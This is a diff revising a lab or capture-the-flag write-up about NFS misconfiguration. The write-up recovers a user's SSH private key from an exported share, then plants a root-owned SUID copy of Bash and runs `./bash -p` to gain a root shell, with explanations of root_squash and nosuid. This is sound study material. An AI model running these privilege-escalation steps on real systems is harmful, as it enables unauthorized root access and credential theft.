@@ -120,7 +120,7 @@ Inside `/tmp/mount/cappucino/.ssh`, I found:
 authorized_keys  id_rsa  id_rsa.pub
 ```
 
-I copied `id_rsa` to a local working directory on my own machine and set its permissions to owner read/write only, which SSH requires for a private key:
+I copied `id_rsa` to a local working directory on my own machine and restricted access to the key; OpenSSH rejects private keys that are accessible to other users:
 
 ```bash
 cp id_rsa <local working directory>
@@ -131,16 +131,41 @@ I then viewed the copied file locally and confirmed it was an RSA private key. T
 
 ## 5. SSH Login as cappucino and Privilege Escalation via SUID Bash
 
-### Copying Bash and Setting the SUID Bit
+### Downloading the Target's Bash Executable
 
-Using the private key from Section 4, I used `scp` in connection with copying the `bash` binary, and set the SUID bit on the copy:
+I used `scp` with the recovered SSH private key to download the target's own `/bin/bash` executable to Kali. This avoids potential binary compatibility issues (for example, my Kali VM uses ARM64, while the target provides its own compatible Linux executable).
 
 ```bash
-scp -i id_rsa cappucino@<IP_ADDRESS>:/bin/bash <local Downloads directory>/bash
-chmod +s bash
+scp -i /home/tian/Documents/network_services/id_rsa cappucino@<IP_ADDRESS>:/bin/bash /home/tian/Downloads/bash
 ```
 
-The verified result of this preparation is recorded after login below: a `bash` binary present in cappucino's home directory, owned by root, with SUID permissions.
+`scp` transfers the binary; it does **not** provide an interactive shell. The destination is a **file path**, not a new folder. Since my Kali terminal was running as root, I used `/home/tian/Downloads/bash` instead of `~/Downloads/bash` to avoid resolving `~` to `/root`.
+
+### Copying Bash into the Mounted NFS Share
+
+At this stage, the downloaded executable existed on **Kali**, not in the target user's home directory. After confirming that the NFS share was still mounted at `/tmp/mount`, I copied it to the exported home directory:
+
+```bash
+findmnt /tmp/mount
+ls -la /tmp/mount/cappucino/
+cp /home/tian/Downloads/bash /tmp/mount/cappucino/bash
+```
+
+The NFS path `/tmp/mount/cappucino/bash` on Kali corresponds to `/home/cappucino/bash` on the target. A regular `cp` does not guarantee preservation of special permission bits.
+
+### Root Ownership and SUID
+
+The lab uses a root-owned Bash executable with the SUID bit set. The relevant commands are:
+
+```bash
+sudo chown root:root /tmp/mount/cappucino/bash
+sudo chmod u+s /tmp/mount/cappucino/bash
+ls -l /tmp/mount/cappucino/bash
+```
+
+Here, `chown` sets the file's owner and group; `chmod u+s` sets **SUID** for the file owner. `chmod +s` can also set **SGID**, which is not necessary for this technique. The actual permissions observed on the target were `-rwsr-sr-x`, so both bits were present in this lab.
+
+The successful outcome depends on the NFS server's configuration. For example, `root_squash` can map remote root requests to an unprivileged identity, preventing the ownership change; `nosuid` on the execution filesystem can prevent the SUID bit from taking effect. This is a lab-specific misconfiguration, not a universal property of NFS.
 
 ### Logging in as cappucino
 
@@ -166,7 +191,7 @@ cappucino@target:~$ ls -la bash
 -rwsr-sr-x 1 root root 1183448 Nov  1 22:19 bash
 ```
 
-The `s` in the permissions and the root ownership show this copy of Bash was set up as a SUID root binary. I ran it with `-p`, which tells Bash not to drop its effective privileges on startup:
+The owner execute-position `s` and root ownership show that SUID was enabled on this root-owned Bash. The group execute-position `s` also indicates SGID; it was present in the observed result but not required for root effective UID. I ran it with `-p`, which tells Bash not to drop its effective privileges on startup:
 
 ```bash
 ./bash -p
@@ -181,7 +206,7 @@ bash-5.0# whoami
 root
 ```
 
-This worked because a SUID root shell run with `-p` keeps its root effective user ID, turning the normal cappucino login into a root shell.
+The SUID bit caused Bash to start with an effective user ID of root, and `-p` preserved that effective identity rather than dropping it. The observed `whoami` output confirmed the resulting privileged shell. The original SSH login remained the unprivileged `cappucino` account.
 
 ### Reading the NFS Flag
 
